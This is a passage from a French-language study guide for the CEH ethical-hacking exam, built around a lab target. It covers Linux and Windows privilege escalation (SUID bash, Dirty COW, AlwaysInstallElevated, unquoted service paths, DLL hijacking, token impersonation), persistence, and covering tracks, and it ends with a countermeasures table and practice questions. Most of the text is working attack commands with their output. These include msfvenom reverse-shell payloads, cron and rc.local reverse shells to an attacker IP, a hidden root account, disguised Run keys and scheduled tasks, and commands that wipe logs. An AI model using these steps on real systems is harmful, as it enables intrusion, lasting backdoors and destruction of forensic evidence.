# Vérifier que /bin/bash est maintenant SUID
ls -la /bin/bash
```
```
-rwsr-xr-x 1 root root 702556 Nov 15 18:15 /bin/bash
```

```bash
# Exploiter le SUID bash
bash -p

bash-3.2# id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

---

### 🛠️ MÉTHODE 4 : Kernel Exploits

```bash
# Identifier la version du kernel
uname -a
```
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
```

```bash
# Chercher des exploits pour ce kernel
searchsploit linux kernel 2.6.24
```

**Sortie :**
```
-------------------------------------------------------------------
 Exploit Title                                      |  Path
-------------------------------------------------------------------
Linux Kernel 2.6.17 < 2.6.24.1 - 'vmsplice' Local | linux/local/5092.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self | linux/local/40611.c
Linux Kernel 2.6.x - 'pipe.c' Local Privilege Escal | linux/local/33321.c
Linux Kernel < 2.6.36.2 - 'Half-Nelson' Local Privil| linux/local/17787.c
-------------------------------------------------------------------
```

**Exploiter Dirty COW (CVE-2016-5195) :**
```bash
# Télécharger l'exploit
searchsploit -m linux/local/40611.c
cp 40611.c /tmp/dirtycow.c

# Compiler sur la cible
cd /tmp
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# Exécuter
./dirtycow /etc/passwd "root2::0:0:root:/root:/bin/bash"
```

**Sortie :**
```
/etc/passwd successfully backed up to /tmp/passwd.bak
Please wait for the exploit to complete... (10-25 seconds)

mmap: b7f80000
madvise 0
procselfmem 1800000000
DirtyCow root privilege escalation
Rewiting /etc/passwd ....
thread stopped
thread stopped
thread stopped
writing complete

Run newgrp or su to get root...

su root2
```
```
# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 📌 PARTIE 5 : PRIVILEGE ESCALATION WINDOWS

### 🛠️ MÉTHODE 1 : AlwaysInstallElevated

```cmd
# Vérifier le registre
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Sortie si vulnérable :**
```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**Si les deux sont à 1 → tout .MSI s'installe en SYSTEM !**

```bash
# Générer un MSI malveillant avec msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f msi -o escalade.msi

# Sur la cible Windows
msiexec /quiet /qn /i escalade.msi
```

---

### 🛠️ MÉTHODE 2 : Unquoted Service Path

```cmd
# Chercher les services avec chemins non quotés contenant des espaces
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
```

**Sortie :**
```
Vulnerable Service    C:\Program Files\Vuln App\App Service\service.exe   Auto
Another Service       C:\Program Files (x86)\MyApp\Startup\myapp.exe      Auto
```

**Explication de la vulnérabilité :**
```
Chemin non quoté : C:\Program Files\Vuln App\App Service\service.exe

Windows cherche dans cet ordre :
1. C:\Program.exe             ← SI ON PEUT ÉCRIRE ICI !
2. C:\Program Files\Vuln.exe  ← OU ICI
3. C:\Program Files\Vuln App\App.exe ← OU ICI
4. C:\Program Files\Vuln App\App Service\service.exe

→ Déposer un exécutable malveillant nommé "Program.exe"
  dans C:\ et attendre redémarrage du service !
```

```bash
# Générer l'exécutable malveillant
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f exe -o Program.exe

# Déposer sur la cible
copy Program.exe "C:\Program.exe"

# Redémarrer le service vulnérable (si permissions)
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

---

### 🛠️ MÉTHODE 3 : DLL Hijacking

```
PRINCIPE :
Quand Windows charge un exécutable, il cherche les DLLs dans cet ordre :
1. Répertoire de l'application
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Variables PATH

Si une DLL est absente et qu'on peut écrire dans
le répertoire de l'application → DLL Hijacking !
```

```bash
# Générer la DLL malveillante
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=192.168.1.5 LPORT=4444 \
         -f dll -o version.dll

# Déposer dans le répertoire de l'application vulnérable
copy version.dll "C:\Program Files\VulnApp\version.dll"

# Lancer l'application → elle charge notre DLL !
```

---

### 🛠️ MÉTHODE 4 : Token Impersonation (Potato Exploits)

```
PRINCIPE SeImpersonatePrivilege :
Certains comptes de service (IIS, MSSQL) ont le droit
SeImpersonatePrivilege → peuvent emprunter l'identité
d'autres utilisateurs, y compris SYSTEM.

POTATO EXPLOITS :
├── Hot Potato   (2016) → NBNS + NTLM relay
├── Rotten Potato → COM Server + SeImpersonate  
├── Juicy Potato → Variante de Rotten Potato
└── Sweet Potato → Windows 10/Server 2019
└── PrintSpoofer → Windows 10/Server 2019/2022
```

```bash
# Vérifier les privilèges dans Meterpreter
meterpreter > getprivs
```

**Sortie :**
```
Enabled Process Privileges
==========================
Name
----
SeAssignPrimaryTokenPrivilege
SeImpersonatePrivilege          ← PRÉSENT !
SeIncreaseQuotaPrivilege
```

```bash
# Charger le module d'incognito
meterpreter > load incognito
Loading extension incognito...Success.

# Lister les tokens disponibles
meterpreter > list_tokens -u
```

**Sortie :**
```
Delegation Tokens Available
========================================
CORP\jean.muamba
IIS APPPOOL\DefaultAppPool
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM          ← SYSTÈME !

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON
```

```bash
# Usurper le token SYSTEM
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
```

**Sortie :**
```
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 📌 PARTIE 6 : MAINTAINING ACCESS — PERSISTANCE

La persistance garantit que l'accès survit aux **redémarrages** et aux **déconnexions**.

---

### 🛠️ PERSISTANCE LINUX

#### Méthode 1 : Clé SSH autorisée

```bash
# Sur la machine compromise
mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... exploit4040@kali" \
     >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh

# Depuis l'attaquant — connexion sans mot de passe
ssh -i ~/.ssh/id_rsa root@192.168.1.10
```

**Sortie connexion SSH :**
```
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686

metasploitable login: 
Last login: Fri Nov 15 18:00:12 2024 from 192.168.1.5

root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

#### Méthode 2 : Crontab backdoor

```bash
# Ajouter une reverse shell dans le crontab root
crontab -e

# Ajouter :
* * * * * /bin/bash -i >& /dev/tcp/192.168.1.5/9999 0>&1

# Vérifier
crontab -l
```

**Sortie :**
```
* * * * * /bin/bash -i >& /dev/tcp/192.168.1.5/9999 0>&1
```

```bash
# Sur l'attaquant, écouter
nc -lvnp 9999
```

**Sortie après 1 minute :**
```
listening on [any] 9999 ...
connect to [192.168.1.5] from (UNKNOWN) [192.168.1.10] 45678
bash: no job control in this shell
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

#### Méthode 3 : Modifier /etc/rc.local

```bash
echo "/bin/bash -i >& /dev/tcp/192.168.1.5/9998 0>&1 &" \
     >> /etc/rc.local

cat /etc/rc.local
```

**Sortie :**
```
#!/bin/sh -e
# rc.local : Exécuté à la fin de chaque niveau multiuser

# Backdoor persistante
/bin/bash -i >& /dev/tcp/192.168.1.5/9998 0>&1 &

exit 0
```

---

#### Méthode 4 : Compte backdoor dans /etc/passwd

```bash
# Générer un hash de mot de passe
openssl passwd -1 -salt backdoor backdoor123
# Output: $1$backdoor$abc123xyz...

# Ajouter un compte root caché
echo "support:$1$backdoor$abc123xyz...:0:0:root:/root:/bin/bash" >> /etc/passwd

# Tester
su support
Password: backdoor123
```

**Sortie :**
```
root@metasploitable:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

### 🛠️ PERSISTANCE WINDOWS — MODULE METASPLOIT

```bash
# Dans une session Meterpreter Windows
meterpreter > run post/windows/manage/persistence_exe \
              STARTUP=SCHEDULER \
              SESSION=1 \
              EXE_PATH=C:\\Windows\\Temp\\svchost32.exe
```

**Sortie :**
```
[*] Running module against WIN-SERVER01
[+] Persistence installed as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\hukRsJWz
[*] Installing payload as C:\Windows\Temp\svchost32.exe
[+] Persistent agent installed at C:\Windows\Temp\svchost32.exe
[*] For cleanup use command: run multi/manage/remove_persistent_payload
```

---

#### Registre Windows — Clés de persistance classiques

```cmd
# Run keys (démarrage utilisateur)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
        /v "WindowsUpdate" /t REG_SZ \
        /d "C:\Windows\Temp\svchost32.exe" /f

# Run keys (démarrage système)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
        /v "SystemUpdate" /t REG_SZ \
        /d "C:\Windows\Temp\svchost32.exe" /f

# Vérifier
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
```

**Sortie :**
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    WindowsUpdate    REG_SZ    C:\Windows\Temp\svchost32.exe
    OneDrive         REG_SZ    "C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
```

---

#### Tâche planifiée Windows (Scheduled Task)

```cmd
# Créer une tâche planifiée au démarrage
schtasks /create /tn "WindowsDefenderUpdate" \
         /tr "C:\Windows\Temp\svchost32.exe" \
         /sc ONSTART /ru SYSTEM /f

# Vérifier
schtasks /query /tn "WindowsDefenderUpdate"
```

**Sortie :**
```
Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
\WindowsDefenderUpdate                   N/A                    Ready
```

---

## 📌 PARTIE 7 : COVERING TRACKS — EFFACEMENT DES TRACES

C'est la dernière phase. Un professionnel doit savoir **ce qu'un attaquant efface** pour mieux configurer la journalisation défensive.

---

### 🛠️ LINUX — Effacement des traces

#### Logs système critiques

```bash
# Voir les logs importants
ls -la /var/log/
```

**Sortie :**
```
total 4892
drwxr-xr-x  8 root   root       4096 Nov 15 18:30 .
drwxr-xr-x 14 root   root       4096 May 14  2012 ..
-rw-r--r--  1 root   root     183427 Nov 15 18:30 auth.log      ← Authentifications
-rw-r--r--  1 root   root    1234567 Nov 15 18:30 syslog        ← Logs système
-rw-r--r--  1 root   root      45678 Nov 15 18:30 apache2/access.log ← Accès web
-rw-r--r--  1 root   root      12345 Nov 15 18:30 apache2/error.log
-rw-r--r--  1 root   root      78901 Nov 15 18:30 wtmp          ← Connexions
-rw-r--r--  1 root   root       1234 Nov 15 18:30 btmp          ← Tentatives échouées
-rw-r--r--  1 root   root       5678 Nov 15 18:30 lastlog       ← Dernières connexions
```

---

```bash
# Effacer les logs d'authentification
echo "" > /var/log/auth.log
echo "" > /var/log/syslog

# Effacer les logs Apache
echo "" > /var/log/apache2/access.log
echo "" > /var/log/apache2/error.log

# Effacer l'historique bash
history -c
echo "" > ~/.bash_history
export HISTSIZE=0
export HISTFILE=/dev/null
unset HISTFILE

# Effacer les connexions (wtmp/utmp)
echo "" > /var/log/wtmp
echo "" > /var/log/btmp
```

---

```bash
# Modifier les timestamps des fichiers modifiés
# (rendre les modifications moins détectables)
touch -t 202001010800 /var/log/auth.log
touch -r /bin/ls /etc/passwd   # Copier timestamp de /bin/ls
```

---

```bash
# Vérifier ce qu'on laisse dans bash_history
cat ~/.bash_history
```

**Sortie AVANT nettoyage :**
```
id
whoami
uname -a
cat /etc/shadow
john --wordlist=rockyou.txt hashes.txt
nc -lvnp 4444
crontab -e
echo "backdoor" >> /etc/rc.local
find / -perm -4000
sudo bash
cat /etc/passwd
history
```

> **Toutes ces commandes documentent l'intrusion !** → Effacement obligatoire.

---

### 🛠️ WINDOWS — Effacement des traces

#### Effacer les Event Logs

```cmd
# Effacer tous les journaux d'événements Windows
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# Vérifier
wevtutil el
```

**En PowerShell :**
```powershell
# Effacer tous les logs en une commande
Get-WinEvent -ListLog * | ForEach-Object { 
    [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) 
}
```

---

#### Via Metasploit

```bash
meterpreter > run post/multi/manage/shell_to_meterpreter
meterpreter > clearev
```

**Sortie :**
```
[*] Clearing Event Log: Application
[+] This Log was cleared
[*] Clearing Event Log: System
[+] This Log was cleared
[*] Clearing Event Log: Security
[+] This Log was cleared
```

---

#### Effacer les fichiers temporaires Windows

```cmd
# Vider le temp utilisateur
del /q /f /s %TEMP%\*

# Vider le temp système
del /q /f /s C:\Windows\Temp\*

# Effacer prefetch (traces d'exécution de programmes)
del /q /f /s C:\Windows\Prefetch\*

# Effacer recent files
del /q /f /s %APPDATA%\Microsoft\Windows\Recent\*

# Effacer historique PowerShell
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

---

## 📌 PARTIE 8 : DÉFENSES ET CONTRE-MESURES

En tant qu'ethical hacker professionnel, tu dois maîtriser les défenses pour les recommander dans tes rapports.

```
┌──────────────────────────────────────────────────────────────────┐
│  ATTAQUE                  │  CONTRE-MESURE                       │
├──────────────────────────────────────────────────────────────────┤
│  Password cracking        │  MFA, bcrypt/Argon2, politique forte │
│  LM/NTLM hash dump        │  Désactiver LM, Windows Credential   │
│                           │  Guard, Protected Users group        │
│  Pass-the-Hash            │  Credential Guard, LAPS              │
│  SUID exploitation        │  Auditer les SUID (find -perm -4000) │
│  Sudo misconfiguration    │  Principe du moindre privilège       │
│  Kernel exploit           │  Patcher le kernel régulièrement     │
│  Cron job exploitation    │  Permissions strictes sur scripts    │
│  DLL Hijacking            │  Safe DLL Search Mode activé         │
│  Token impersonation      │  Disable SeImpersonatePrivilege      │
│  Persistance registre     │  Monitoring clés Run avec Autoruns   │
│  Covering tracks          │  SIEM centralisé (logs immuables)    │
│                           │  WORM storage pour les logs          │
└──────────────────────────────────────────────────────────────────┘
```

---

## 📌 RÉSUMÉ FINAL — CE QUE L'EXAMEN VA TESTER

```
✅ Architecture SAM, NTDS.dit, LSASS
✅ LM Hash vs NT Hash vs NTLMv2 — différences et faiblesses
✅ Kerberos — TGT, TGS, KDC et attaques (Kerberoasting, Golden Ticket)
✅ John the Ripper — modes (wordlist, single, incremental, rules)
✅ Hashcat — modes (-m 1000=NTLM, -a 0=dict, -a 3=mask)
✅ Hydra — bruteforce services réseau (SSH, FTP, HTTP)
✅ Rainbow tables — principe et contre-mesure (sel/salt)
✅ Metasploit — structure et workflow (search, use, set, run)
✅ Meterpreter — commandes clés (sysinfo, getuid, download, keyscan)
✅ SUID exploitation — find, python, vim, bash
✅ Sudo misconfiguration — NOPASSWD et GTFOBins
✅ Cron job exploitation — scripts world-writable
✅ Dirty COW — kernel exploit emblématique
✅ AlwaysInstallElevated — Windows privesc
✅ Unquoted Service Path — Windows privesc
✅ DLL Hijacking — mécanisme et exploitation
✅ Token Impersonation — SeImpersonatePrivilege
✅ Persistance Linux — SSH keys, crontab, rc.local, /etc/passwd
✅ Persistance Windows — Run keys, schtasks
✅ Covering Tracks — logs Linux et Event Logs Windows
✅ Contre-mesures pour chaque vecteur
```

---

## 🧪 QUESTIONS TYPE EXAMEN CEH — MODULE 6

**Q1 :** Quelle base de données locale stocke les hashes des mots de passe des comptes Windows locaux ?
> **Réponse : SAM (Security Account Manager) — C:\Windows\System32\config\SAM**

**Q2 :** Pourquoi le LM Hash est-il plus facile à craquer que le NT Hash ?
> **Réponse : LM convertit en majuscules (espace réduit), divise le mot de passe en 2 blocs de 7 caractères (bruteforce parallèle), et utilise une clé DES fixe. Le NT Hash utilise MD4 sur le mot de passe complet sensible à la casse.**

**Q3 :** Un attaquant utilise `hashcat -m 1000 -a 0 hash.txt rockyou.txt`. Quel type de hash cible-t-il et quelle technique utilise-t-il ?
> **Réponse : -m 1000 = NTLM Windows. -a 0 = attaque dictionnaire (wordlist pure). Il cible des hashes NTLM avec un dictionnaire.**

**Q4 :** Quelle commande Linux liste tous les binaires avec le bit SUID activé ?
> **Réponse : `find / -perm -4000 -type f 2>/dev/null`**

**Q5 :** `sudo -l` retourne `(root) NOPASSWD: /usr/bin/find`. Comment exploiter cela ?
> **Réponse : `sudo find . -exec /bin/sh -p \; -quit` → shell root sans mot de passe**

**Q6 :** Qu'est-ce que la technique "Pass-the-Hash" ?
> **Réponse : Utiliser directement le hash NTLM d'un utilisateur pour s'authentifier sur un service sans connaître le mot de passe en clair. Fonctionne car Windows accepte le hash comme preuve d'identité.**

**Q7 :** Quel privilège Windows permet l'attaque Token Impersonation (Potato exploits) ?
> **Réponse : SeImpersonatePrivilege — permet d'emprunter l'identité d'autres utilisateurs, y compris SYSTEM.**

**Q8 :** Quelles sont les 3 principales clés de registre Windows utilisées pour la persistance au démarrage ?
> **Réponse : HKCU\Software\Microsoft\Windows\CurrentVersion\Run, HKLM\Software\Microsoft\Windows\CurrentVersion\Run, et HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon**

**Q9 :** Quelle commande Meterpreter efface les journaux d'événements Windows ?
> **Réponse : `clearev` — efface Application, System et Security logs**

**Q10 :** Dans l'attaque Unquoted Service Path, pourquoi Windows est-il vulnérable ?
> **Réponse : Quand un chemin de service contient des espaces sans guillemets, Windows cherche l'exécutable à chaque espace du chemin. Un attaquant peut déposer un exécutable malveillant dans un répertoire antérieur (ex: C:\Program.exe) qui sera exécuté à la place du service légitime.**

---

> **Module 6 terminé. ✅**
